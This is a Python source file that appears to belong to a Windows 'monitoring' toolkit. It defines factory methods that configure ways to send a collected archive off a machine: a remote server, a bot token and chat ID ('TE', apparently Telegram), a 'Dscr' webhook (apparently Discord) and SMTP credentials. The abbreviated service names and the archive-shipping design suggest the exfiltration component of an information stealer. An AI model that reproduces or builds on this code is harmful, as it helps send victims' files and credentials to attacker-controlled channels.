from systoring.windowsmonitoring.senders import Server, TE, Dscr, Smtp


class Senders:

    @staticmethod
    def server(server: str) -> Server:
        """
        Creates a sender for the server.

        Parameters:
        - server [str]: A link to the rooted server that accepts the file as input.

        Returns:
        - Server: Server sender object.
        """
        return Server(server=server)

    @staticmethod
    def TE(token: str, user_id: int) -> TE:
        """
        Creates a sender for the TE.

        Parameters:
        - token [str]: The token of the bot that will send the archive.
        - user_id [int]: ID of the user or chat room where the bot will send the archive to.

        Returns:
        - TE: TE sender object.
        """
        return TE(token=token, user_id=user_id)

    @staticmethod
    def Dscr(webhook: str) -> Dscr:
        """
        Creates a sender for the Dscr.

        Parameters:
        - webhook [str]: Hook of the Dscr bot.

        Returns:
        - Dscr: Dscr sender object.
        """
        return Dscr(webhook=webhook)

    @staticmethod
    def smtp(sender_email: str, sender_password: str, recipient_email: str, smtp_server: str = "smtp.gmail.com", smtp_port: int = 587) -> Smtp:
        """
        Creates a sender for the Email.

        Parameters:
        - sender_email [str]: Sender's email.
        - sender_password [str]: Sender's password.
        - recipient_email [str]: Recipient's email.
        - smtp_server [str]: Smtp server.
        - smtp_port [int]: Smtp port.

        Returns:
        - Smtp: Smtp sender object.
        """
        return Smtp(
            sender_email=sender_email,
            sender_password=sender_password,
            recipient_email=recipient_email,
            smtp_server=smtp_server,
            smtp_port=smtp_port
        )
